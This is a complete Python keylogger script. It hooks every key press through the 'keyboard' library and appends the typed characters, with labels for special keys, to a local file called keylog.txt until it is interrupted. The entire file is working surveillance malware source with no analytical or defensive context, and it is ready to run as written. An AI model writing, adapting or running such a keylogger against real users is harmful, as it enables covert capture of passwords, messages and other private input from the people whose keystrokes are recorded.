#!/usr/bin/env python3
import keyboard  # install with: pip install keyboard
import datetime
import os

LOG_FILE = "keylog.txt"

def on_key_event(event):
    """Callback for every key press."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        if event.event_type == "down":
            # Handle special keys
            if event.name == "space":
                f.write(" ")
            elif event.name == "enter":
                f.write("\n")
            elif event.name == "backspace":
                f.write("[BACKSPACE]")
            elif event.name == "tab":
                f.write("\t")
            elif len(event.name) == 1:  # printable character
                f.write(event.name)
            else:
                f.write(f"[{event.name.upper()}]")

def main():
    print("Keylogger started. Press Ctrl+C to stop.")
    # Hook all key down events
    keyboard.on_press(on_key_event)
    try:
        keyboard.wait()  # blocks until interrupted
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
    finally:
        keyboard.unhook_all()

if __name__ == "__main__":
    main()
